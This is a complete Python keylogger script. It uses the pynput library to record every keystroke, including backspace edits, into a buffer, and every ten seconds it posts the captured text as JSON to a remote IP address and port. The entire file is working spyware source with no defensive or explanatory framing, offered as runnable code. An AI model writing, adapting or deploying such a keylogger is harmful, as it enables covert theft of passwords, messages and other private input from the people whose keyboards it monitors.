import json
import threading

import requests
from icecream import ic
from pynput import keyboard

text = ""

ip_address = "0.0.0.0"
port_number = "8080"
time_interval = 10


def send_post_request():
    try:
        payload = json.dumps({"keyboard_data": text})
        requests.post(
            f"http://{ip_address}:{port_number}",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        timer = threading.Timer(time_interval, send_post_request)
        timer.start()
    except requests.exceptions.RequestException as e:
        ic(f"Network-related error occurred: {e}")
    except json.JSONDecodeError as e:
        ic(f"JSON encoding error: {e}")
    except Exception as e:
        ic(f"An unexpected error occurred: {e}")


def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")


with keyboard.Listener(on_press=on_press) as listener:
    send_post_request()
    listener.join()
